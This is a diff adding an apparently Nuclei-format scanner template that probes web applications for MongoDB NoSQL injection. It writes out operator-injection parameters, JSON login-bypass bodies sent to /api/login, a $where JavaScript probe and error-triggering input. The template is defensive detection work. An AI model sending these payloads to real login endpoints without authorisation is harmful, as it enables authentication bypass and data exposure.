@@ -1,0 +1,133 @@
+id: nosql-injection-detection
+
+info:
+  name: NoSQL Injection - MongoDB & CouchDB Detection
+  author: achraf-chehboun
+  severity: high
+  description: |
+    Detects NoSQL injection vulnerabilities in MongoDB and CouchDB-backed applications.
+    Tests for operator injection ($gt, $ne, $regex, $where), JSON injection in REST APIs,
+    and JavaScript injection in server-side evaluation. Uses non-destructive detection —
+    only read-based operations are tested, no data modification occurs.
+  reference:
+    - https://owasp.org/Top10/A03_2021-Injection/
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-943
+  metadata:
+    max-request: 8
+  tags: owasp-top10,injection,nosql,mongodb,detection-only
+
+http:
+  # Test 1: MongoDB operator injection via URL parameters
+  - raw:
+      - |
+        GET /?username[$ne]=impossible&password[$ne]=impossible HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: dsl
+        name: nosql-operator-injection
+        dsl:
+          - '!contains(body, "invalid") && !contains(body, "error") && !contains(body, "unauthorized") && !contains(body, "login") && len(body) > 100'
+
+  # Test 2: MongoDB $regex operator injection
+  - raw:
+      - |
+        GET /?username[$regex]=.*&password[$regex]=.* HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: dsl
+        name: nosql-regex-injection
+        dsl:
+          - '!contains(body, "invalid") && !contains(body, "error") && !contains(body, "login") && len(body) > 100'
+
+  # Test 3: JSON body NoSQL injection
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"username":{"$ne":""},"password":{"$ne":""}}
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"username":{"$gt":""},"password":{"$gt":""}}
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: json-nosql-auth-bypass
+        dsl:
+          - 'status_code_1 == 200 && (contains(body_1, "token") || contains(body_1, "session") || contains(body_1, "success"))'
+          - 'status_code_2 == 200 && (contains(body_2, "token") || contains(body_2, "session") || contains(body_2, "success"))'
+        condition: or
+
+  # Test 4: MongoDB $where JavaScript injection
+  - raw:
+      - |
+        GET /?search=1;return%20true HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?search=1;return%20false HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: where-js-injection
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && len(body_1) != len(body_2) && (len(body_1) - len(body_2) > 100 || len(body_2) - len(body_1) > 100)'
+
+  # Test 5: MongoDB error detection (confirms MongoDB backend)
+  - raw:
+      - |
+        GET /?id=1'%22%5C HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: mongodb-error-exposed
+        regex:
+          - '(?i)MongoError'
+          - '(?i)MongoDB.*?Error'
+          - '(?i)Mongo\..*?Exception'
+          - '(?i)com\.mongodb'
+          - '(?i)mongoose.*?error'
+          - '(?i)CastError.*?ObjectId'
+          - '(?i)BSONTypeError'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: nosql-error-detail
+        group: 0
+        regex:
+          - '(?i)((?:Mongo|BSON|mongoose)[\w.]*(?:Error|Exception)[^<\n]{0,200})'
